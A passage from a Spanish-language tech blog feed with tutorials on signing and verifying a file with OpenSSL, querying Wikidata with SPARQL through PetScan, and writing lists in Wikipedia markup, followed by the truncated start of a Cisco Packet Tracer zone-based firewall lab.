class="highlight"><code>cisco@labvm:~$ openssl genpkey -algorithm RSA -out private_key.pem
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/firma_digital-01-480.webp 480w,/assets/img/firma_digital-01-800.webp 800w,/assets/img/firma_digital-01-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/firma_digital-01.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p><strong>Donde:</strong></p> <ul> <li><strong>openssl:</strong> Es la herramienta para ejecutar operaciones criptográficas como generación de claves, creación de certificados, encriptación, etc.</li> <li><strong>genpkey:</strong> Es la subcomando para generar claves privadas. En versiones modernas de OpenSSL, se recomienda usar genpkey en lugar de genrsa, ya que es más versátil y admite varios algoritmos.</li> <li><strong>-algorithm RSA:</strong> Especifica el algoritmo que se utilizará para generar la clave será RSA. RSA (Rivest–Shamir–Adleman) es un algoritmo de cifrado de clave pública muy común en protocolos de seguridad como TLS/SSL.</li> <li><strong>-out private_key.pem:</strong> Indica el nombre del archivo de salida donde se guardará la clave privada generada. El formato del archivo será PEM (Privacy-Enhanced Mail), que es un formato codificado en texto plano (Base64) para almacenar datos criptográficos.</li> </ul> <p>Utilizando <strong>cat</strong> o cualquier lector/editor de texto, la llave privada téndra la siguiente forma</p> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/firma_digital-02-480.webp 480w,/assets/img/firma_digital-02-800.webp 800w,/assets/img/firma_digital-02-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/firma_digital-02.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <h2 id="creación-de-la-llave-publica"><strong>Creación de la llave publica</strong></h2> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cisco@labvm:~$ openssl pkey -in private_key.pem -pubout -out public_key.pem
</code></pre></div></div> <p><strong>Donde:</strong></p> <ul> <li><strong>openssl:</strong> Herramienta de línea de comandos para realizar operaciones criptográficas.</li> <li><strong>pkey:</strong> Subcomando utilizado para trabajar con claves públicas y privadas.</li> <li><strong>-in private_key.pem:</strong> Especifica el archivo de entrada que contiene la clave privada desde la cual se derivará la clave pública. En este caso, private_key.pem contiene la clave privada en formato PEM.</li> <li><strong>-pubout:</strong> Indica que se desea extraer la clave pública asociada a la clave privada proporcionada. Esto generará la clave pública correspondiente en un archivo separado.</li> <li><strong>-out public_key.pem:</strong> Especifica el archivo de salida donde se guardará la clave pública generada. El formato será PEM, que utiliza codificación Base64 para representar la clave en texto plano.</li> </ul> <p>Una vez creada la llave pública se verá de la siguiente manera</p> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/firma_digital-03-480.webp 480w,/assets/img/firma_digital-03-800.webp 800w,/assets/img/firma_digital-03-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/firma_digital-03.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <p>para objeto práctico se creó el documento contract.txt para demostración, utilizando el comando <strong>echo</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cisco@labvm:~$ echo Porfavor transfiere 200000 de dolares a Alexa las 6 pm de hoy &gt; contract.txt
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/firma_digital-04-480.webp 480w,/assets/img/firma_digital-04-800.webp 800w,/assets/img/firma_digital-04-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/firma_digital-04.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h3 id="firma-del-documento"><strong>Firma del documento</strong></h3> <p>Firmaremos el documento, para ello se usará la clave privada creada anteriormente para posteriormente verificar su firma, el comando a utilizar es <strong>signature</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cisco@labvm:~$ openssl dgst -sha256 -sign private_key.pem -out signature contract.txt
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/firma_digital-05-480.webp 480w,/assets/img/firma_digital-05-800.webp 800w,/assets/img/firma_digital-05-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/firma_digital-05.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h3 id="verificación-de-la-firma"><strong>Verificación de la firma</strong></h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cisco@labvm:~$ openssl dgst -sha256 -verify public_key.pem -signature signature contract.txt
</code></pre></div></div> <p><strong>Donde</strong></p> <ul> <li><strong>openssl:</strong> Herramienta de línea de comandos para realizar operaciones criptográficas.</li> <li><strong>dgst:</strong> Subcomando para calcular o verificar hashes.</li> <li><strong>-sha256:</strong> Especifica el algoritmo de hash que se usará durante la verificación. En este caso, SHA-256, que es un algoritmo seguro y ampliamente utilizado.</li> <li><strong>-verify public_key.pem:</strong> Indica que se usará la clave pública almacenada en el archivo public_key.pem para verificar la firma. La clave pública corresponde a la clave privada que generó la firma.</li> <li><strong>-signature signature:</strong> Especifica el archivo que contiene la firma digital generada previamente. Esta firma es el resultado de firmar el archivo contract.txt con la clave privada correspondiente.</li> <li><strong>contract.txt:</strong> Es el archivo original cuyo hash se comparará con la firma digital.</li> </ul> <p>En el caso de una firma verificado se vera de la siguiente manera</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/firma_digital-06-480.webp 480w,/assets/img/firma_digital-06-800.webp 800w,/assets/img/firma_digital-06-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/firma_digital-06.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h3 id="firma-en-documento-alterado"><strong>Firma en documento alterado</strong></h3> <p>Editamos el documento contract.txt</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/firma_digital-07-480.webp 480w,/assets/img/firma_digital-07-800.webp 800w,/assets/img/firma_digital-07-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/firma_digital-07.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Verificamos la firma</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/firma_digital-08-480.webp 480w,/assets/img/firma_digital-08-800.webp 800w,/assets/img/firma_digital-08-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/firma_digital-08.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div>]]></content><author><name></name></author><category term="Seguridad"/><category term="Informática"/><category term="SOC,"/><category term="Firma"/><category term="Dígital,"/><category term="Criptografía,"/><category term="ciberseguridad,"/><category term="Network"/><category term="Defense"/><summary type="html"><![CDATA[Creación y verificación de una firma dígital]]></summary></entry><entry><title type="html">Wikipedia - Consultas sparql con petscan</title><link href="https://sefamol.github.io/blog/2024/intro-consultas-sparql-wikipedia/" rel="alternate" type="text/html" title="Wikipedia - Consultas sparql con petscan"/><published>2024-12-24T14:20:00+00:00</published><updated>2024-12-24T14:20:00+00:00</updated><id>https://sefamol.github.io/blog/2024/intro-consultas-sparql-wikipedia</id><content type="html" xml:base="https://sefamol.github.io/blog/2024/intro-consultas-sparql-wikipedia/"><![CDATA[<h1 id="datos-generales"><strong>Datos Generales</strong></h1> <ul> <li><strong>Plataforma</strong>: Wikipedia, Wikidata</li> <li><strong>Dificultad</strong>: Media</li> <li><strong>Duracion</strong>: 20 minutos</li> <li><strong>Observaciones</strong>: Realización de consultas no complejas en sparql con petscan</li> </ul> <hr/> <h1 id="un-poco-de-teoría"><strong>Un poco de teoría</strong></h1> <h2 id="qué-es-sparql"><strong>Qué es sparql?</strong></h2> <p>En términos simples, es un lenguaje para la consulta de base de datos. Con algunas particularidades.</p> <ul> <li>Primero, esta más cerca de ser un lenguaje de base de datos no relacional (NoSQL) aunque maneja una sintaxis parecida a SQL.</li> <li>Segundo, Este lenguaje esta pensado para hacer consultas en la web semántica.</li> <li>Tercero, lo usa Wikipedia para las consultas de su data.</li> </ul> <p>Más teoría en: <a href="https://datascience.recursos.uoc.edu/es/sparql/">https://datascience.recursos.uoc.edu/es/sparql/</a> y <a href="https://es.wikipedia.org/wiki/SPARQL">https://es.wikipedia.org/wiki/SPARQL</a></p> <h2 id="que-es-una-consulta"><strong>Que es una consulta?</strong></h2> <p>De forma muy pero muy básica, una consulta es una petición de algo a un catálogo existente. Por ejemplo si entramos a una tienda <strong>consultamos</strong> si existe “x” producto, la persona que atiende nos responderá sobre la existencia del mismo. Lo mismo sucede con las bases de datos, con la diferencia de que se manejan grandes cantidades de datos y, dependiendo los permisos, es posible realizar diferentes actividades en las <strong>tablas</strong> existentes en la base de datos.</p> <p>Más teoría en <a href="https://www.hostinger.es/tutoriales/que-es-consulta-base-de-datos/">https://www.hostinger.es/tutoriales/que-es-consulta-base-de-datos/</a></p> <h2 id="como-hago-una-consulta-en-sparql"><strong>Como hago una consulta en sparql?</strong></h2> <p>La sintaxis utilizada en SPARQL está diseñada para la manipulación y consulta de grafos RDF (Resource Description Framework) en la web. Se basa en tripletas que representan una estructura de datos formada por entidades, propiedades, y sus relaciones. Estas tripletas siguen el patrón: sujeto - predicado - objeto. Para realizar una consulta en SPARQL, se necesitan dos elementos clave: las entidades, que representan los nodos del grafo, y las propiedades, que describen las relaciones entre esas entidades.</p> <p>Una mejor explicación la podemos encontrar en: <a href="https://data.cervantesvirtual.com/noticia/tutorial-de-inicio-a-sparql">https://data.cervantesvirtual.com/noticia/tutorial-de-inicio-a-sparql</a></p> <h1 id="vamos-a-la-práctica"><strong>Vamos a la práctica</strong></h1> <h2 id="petscan">Petscan</h2> <p>Empecemos conociendo como ingresar y realizar nuestra consulta.</p> <ul> <li> <ol> <li>Ingresamos a <a href="https://petscan.wmcloud.org/">https://petscan.wmcloud.org/</a></li> </ol> </li> <li> <ol> <li>Seleccionamos la pestaña <strong>Other sources</strong> -&gt; <strong>Sparql</strong></li> </ol> </li> </ul> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/intro-sparql-01-480.webp 480w,/assets/img/intro-sparql-01-800.webp 800w,/assets/img/intro-sparql-01-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/intro-sparql-01.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <ul> <li> <ol> <li>Realizaremos una consulta para conocer especies animales endemicas de Bolivia.</li> </ol> </li> </ul> <p><strong>Consulta utilizada</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT ?especie ?especieLabel ?nombreCientifico ?claseLabel
WHERE {
  ?especie wdt:P31 wd:Q16521;                 # Instancia de especie
           wdt:P183 wd:Q750.                  # País de distribución nativa: Bolivia
  OPTIONAL { ?especie wdt:P225 ?nombreCientifico. } # Nombre científico (opcional)
  OPTIONAL { ?especie wdt:P105 ?clase. }      # Rango taxonómico o clase (opcional)
  SERVICE wikibase:label { bd:serviceParam wikibase:language "[AUTO_LANGUAGE],en". }
}
ORDER BY ?especieLabel
</code></pre></div></div> <p>Notemos que los campos <strong>wd</strong> y <strong>wdt</strong> son las entidades y propiedades de las que hablamos en la teoría.</p> <p><strong>wdt (Wikidata Truthy Statements)</strong></p> <ul> <li><strong>wdt:</strong> se refiere a las <strong>declaraciones verificadas</strong> o afirmaciones “truthy” en Wikidata. Estas son las relaciones directas entre un sujeto y un objeto, omitiendo información adicional como referencias, calificadores o rangos temporales. <ul> <li>Es ideal para consultas rápidas, ya que no incluye datos adicionales.</li> </ul> </li> </ul> <p><strong>En el ejemplo se entiende de esta manera:</strong></p> <ul> <li><strong>wdt:P31:</strong> Representa la propiedad <strong>“instancia de”</strong> en Wikidata.</li> <li><strong>wdt:P183:</strong> Representa la propiedad <strong>“país de distribución nativa”</strong>.</li> </ul> <p><strong>Uso:</strong></p> <ul> <li>Permite filtrar por elementos que tienen relaciones simples y directas. En este caso: <ul> <li><strong>?especie wdt:P31 wd:Q16521</strong>: Busca elementos donde el sujeto (<code class="language-plaintext highlighter-rouge">?especie</code>) sea una <strong>instancia de especie</strong> (<code class="language-plaintext highlighter-rouge">Q16521</code>).</li> <li><strong>?especie wdt:P183 wd:Q750</strong>: Busca elementos donde el sujeto (<code class="language-plaintext highlighter-rouge">?especie</code>) tenga a <strong>Bolivia</strong> (<code class="language-plaintext highlighter-rouge">Q750</code>) como país de distribución nativa. —</li> </ul> </li> </ul> <p><strong>wd (Wikidata Entity)</strong></p> <ul> <li><code class="language-plaintext highlighter-rouge">wd:</code> se refiere a las <strong>entidades de Wikidata</strong>. Estas entidades son identificadores únicos asignados a conceptos, personas, lugares, propiedades, etc., en Wikidata.</li> <li>Los identificadores tienen el formato <code class="language-plaintext highlighter-rouge">Q#####</code> para elementos o <code class="language-plaintext highlighter-rouge">P#####</code> para propiedades.</li> </ul> <p><strong>En el ejemplo se entiende de esta manera:</strong></p> <ul> <li><code class="language-plaintext highlighter-rouge">wd:Q16521</code>: Representa el concepto de <strong>especie</strong>.</li> <li><code class="language-plaintext highlighter-rouge">wd:Q750</code>: Representa el concepto de <strong>Bolivia</strong>.</li> </ul> <p><strong>Uso:</strong></p> <ul> <li>Se utiliza como valor de una propiedad en una declaración. En este caso: <ul> <li><code class="language-plaintext highlighter-rouge">wd:Q16521</code> es el valor de <code class="language-plaintext highlighter-rouge">wdt:P31</code> para especificar que algo es una especie.</li> <li><code class="language-plaintext highlighter-rouge">wd:Q750</code> es el valor de <code class="language-plaintext highlighter-rouge">wdt:P183</code> para indicar que Bolivia es el país de distribución nativa.</li> </ul> </li> </ul> <h2 id="de-donde-se-obtiene-los-valores-p-y-q-para-la-consulta"><strong>De donde se obtiene los valores “P” y “Q” para la consulta?</strong></h2> <h3 id="para-el-valor-q"><strong>Para el valor Q</strong></h3> <ul> <li>ingresamos a www.wikidata.org</li> <li>Realizamos la búsqueda de nuestro interés y observamos el valor Q de cada respuesta</li> </ul> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/intro-sparql-04-480.webp 480w,/assets/img/intro-sparql-04-800.webp 800w,/assets/img/intro-sparql-04-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/intro-sparql-04.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <h3 id="para-el-valor-p"><strong>Para el valor P</strong></h3> <p>La lista de propiedades podemos encontrarla en https://www.wikidata.org/wiki/Wikidata:List_of_properties En esta pagina ingresamos el <strong>valor buscado</strong>, oprimimos en <strong>buscar</strong> y obtenemos el resultado. En la imagen muestra el valor <strong>P</strong> de la propiedad endémico utilizado en nuestra búsqueda.</p> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/intro-sparql-05-480.webp 480w,/assets/img/intro-sparql-05-800.webp 800w,/assets/img/intro-sparql-05-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/intro-sparql-05.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <p>El resultado será el siguiente:</p> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/intro-sparql-03-480.webp 480w,/assets/img/intro-sparql-03-800.webp 800w,/assets/img/intro-sparql-03-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/intro-sparql-03.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <p>podemos observar que cada artículo cuenta con su valor <strong>Q</strong></p> <h2 id="hagamoslo-sencillo"><strong>Hagamoslo sencillo</strong></h2> <p>Hasta aqui es un enredo que a pesar de que es intuitivo es complicado de construir y de hallar la información. Por ello recurri a chatgpt, aplicación que construye la consulta de manera automática. El prompt que utilice es el siguiente:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ayudame a construir una petición que muestre todos las especies animales endemicas de bolivia existentes en la base de datos de wikipedia utilizando sparql.
</code></pre></div></div> <p>Obteniendo la siguiente respuesta que se utilizo en la consulta de ejemplo</p> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/intro-sparql-07-480.webp 480w,/assets/img/intro-sparql-07-800.webp 800w,/assets/img/intro-sparql-07-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/intro-sparql-07.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <p>copiamos el código propuesto a la consulta en sparql https://petscan.wmcloud.org/ y oprimimos en <strong>do it</strong></p> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/intro-sparql-08-480.webp 480w,/assets/img/intro-sparql-08-800.webp 800w,/assets/img/intro-sparql-08-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/intro-sparql-08.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <p>Parte del resultado se verá asi</p> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/intro-sparql-09-480.webp 480w,/assets/img/intro-sparql-09-800.webp 800w,/assets/img/intro-sparql-09-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/intro-sparql-09.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <p>Es todo por esta entrada. La teoría y la práctica anterior explica brevemente el contenido de esta consulta. Si, falta las variables que filtra la consulta pero lo básico y de donde sale lo expuesto espero que se comprenda. Realizare más entradas para complejizar estas consultas.</p> <p><strong>Feliz Navidad¡¡¡ Abrazo fuerte :)</strong></p>]]></content><author><name></name></author><category term="wikipedia"/><category term="wikipedia,"/><category term="wikidata,"/><category term="sparql,"/><category term="petscan,"/><category term="nosql,"/><category term="base"/><category term="de"/><category term="datos"/><summary type="html"><![CDATA[Tutorial introductorio para hacer consultas sparql con petscan]]></summary></entry><entry><title type="html">Wikipedia - Creación de listas</title><link href="https://sefamol.github.io/blog/2024/listas-wikipedia/" rel="alternate" type="text/html" title="Wikipedia - Creación de listas"/><published>2024-12-21T21:20:00+00:00</published><updated>2024-12-21T21:20:00+00:00</updated><id>https://sefamol.github.io/blog/2024/listas-wikipedia</id><content type="html" xml:base="https://sefamol.github.io/blog/2024/listas-wikipedia/"><![CDATA[<h1 id="datos-generales"><strong>Datos Generales</strong></h1> <ul> <li><strong>Plataforma</strong>: Wikipedia</li> <li><strong>Dificultad</strong>: Baja</li> <li><strong>Duracion</strong>: 10 minutos</li> <li><strong>Observaciones</strong>: Este tutorial es introductorio a una serie de tutoriales genrados para la edición en wikipedia.</li> </ul> <hr/> <h2 id="un-poco-de-teoría">Un poco de teoría</h2> <p>En wikipedia se usa los terminos prosa y lista para la descripción de los elementos relevantes de una publicación, de esta manera estos terminos se definen de la siguietne manera: <strong>prosa</strong>: teoría acerca del tema (narrado) <strong>lista</strong>: información clave. (lista de tareas)</p> <h2 id="preparación-de-ambiente-de-prueba">Preparación de ambiente de prueba</h2> <p>Para el proposito de este tutorial es necesario crear un ambiente de prueba que nos permita realizar los cambios sin afectar a una publicación existente</p> <p><strong>Creación de un taller</strong></p> <p>Click en la pestaña del menu del usuario para luego seleccionar <strong>taller</strong></p> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/wikipedia-listas-01-480.webp 480w,/assets/img/wikipedia-listas-01-800.webp 800w,/assets/img/wikipedia-listas-01-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/wikipedia-listas-01.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <p>Luego seleccionamos la opción <strong>editar código</strong></p> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/wikipedia-listas-02-480.webp 480w,/assets/img/wikipedia-listas-02-800.webp 800w,/assets/img/wikipedia-listas-02-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/wikipedia-listas-02.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <p>Con estos pasos ya podemos iniciar las pruebas</p> <h2 id="lista-simple-numerada">Lista simple numerada</h2> <p><strong>Código utilizado</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Elemento de lista 1
# Elemento de lista 2
# Elemento de lista 3
</code></pre></div></div> <p><strong>Resultado</strong></p> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/wikipedia-listas-04-480.webp 480w,/assets/img/wikipedia-listas-04-800.webp 800w,/assets/img/wikipedia-listas-04-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/wikipedia-listas-04.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <h2 id="lista-numerada-con-subelementos">Lista numerada con subelementos</h2> <p><strong>Código utilizado</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'''lista numerada'''
# Elemento 1
:# Subelemento 1
:# Subelemento 2
# Elemento de lista 2
# Elemento de lista 3
</code></pre></div></div> <p><strong>Resultado</strong></p> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/wikipedia-listas-06-480.webp 480w,/assets/img/wikipedia-listas-06-800.webp 800w,/assets/img/wikipedia-listas-06-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/wikipedia-listas-06.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <h2 id="lista-con-viñetas">Lista con viñetas</h2> <p><strong>Código utilizado</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'''lista con viñetas y subelementos'''
* Viñeta 1
:* Viñeta subelemento 1
:* Viñeta Subelemento 2
* Viñeta 2
:* Viñeta subelemento 1
:* Viñeta Subelemento 2
* Viñeta 3
</code></pre></div></div> <p><strong>Resultado</strong></p> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/wikipedia-listas-07-480.webp 480w,/assets/img/wikipedia-listas-07-800.webp 800w,/assets/img/wikipedia-listas-07-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/wikipedia-listas-07.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <h2 id="lista-en-columnas">lista en columnas</h2> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'''lista dividida en columnas'''
\{\{lista_de_columnas|3|
* Viñeta 1
:* Viñeta subelemento 1
:* Viñeta Subelemento 2
* Viñeta 2
:* Viñeta subelemento 1
:* Viñeta Subelemento 2
* Viñeta 3
* Viñeta 4
:* Viñeta subelemento 1
:* Viñeta Subelemento 2
* Viñeta 5
:* Viñeta subelemento 1
:* Viñeta Subelemento 2
* Viñeta 6
* Viñeta 7
:* Viñeta subelemento 1
:* Viñeta Subelemento 2
* Viñeta 8
:* Viñeta subelemento 1
:* Viñeta Subelemento 2
* Viñeta 9
}}
</code></pre></div></div> <p><strong>Resultado</strong></p> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/wikipedia-listas-08-480.webp 480w,/assets/img/wikipedia-listas-08-800.webp 800w,/assets/img/wikipedia-listas-08-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/wikipedia-listas-08.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div>]]></content><author><name></name></author><category term="wikipedia"/><category term="wikipedia,"/><category term="listas,"/><category term="edicion"/><summary type="html"><![CDATA[Tutorial para la creación de listas en wikipedia]]></summary></entry><entry><title type="html">Packet Tracer - Configure ZPF</title><link href="https://sefamol.github.io/blog/2024/Configure-ZPF/" rel="alternate" type="text/html" title="Packet Tracer - Configure ZPF"/><published>2024-12-19T21:30:00+00:00</published><updated>2024-12-19T21:30:00+00:00</updated><id>https://sefamol.github.io/blog/2024/Configure%20ZPF</id><content type="html" xml:base="https://sefamol.github.io/blog/2024/Configure-ZPF/"><![CDATA[<h1 id="datos-generales"><strong>Datos Generales</strong></h1> <ul> <li><strong>Software</strong>: Cisco - Packet Tracer</li> <li><strong>Dificultad</strong>: Media</li> <li><strong>Duracion</strong>: 30 minutos</li> <li><strong>Observaciones</strong>: Configuración básica de una ZPF.</li> </ul> <h2 id="tabla-de-direccionamiento"><strong>Tabla de direccionamiento</strong></h2> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ZPF-01-480.webp 480w,/assets/img/ZPF-01-800.webp 800w,/assets/img/ZPF-01-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ZPF-01.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ZPF-08-480.webp 480w,/assets/img/ZPF-08-800.webp 800w,/assets/img/ZPF-08-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ZPF-08.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h3 id="objetivos"><strong>Objetivos</strong></h3> <ul> <li>Verificar la conectividad entre dispositivos antes de la configuración del Firewall.</li> <li>Configurar una zone-based policy firewall (ZPF) en el router R3.</li> <li>Verficar la funcionalidad del ZPF.</li> </ul> <h3 id="instrucciones"><strong>Instrucciones</strong></h3> <h4 id="parte-1---verificar-la-conectividad-entre-dispositivos-previo-a-la-configuración-del-firewall"><strong>Parte 1 - Verificar la conectividad entre dispositivos previo a la configuración del 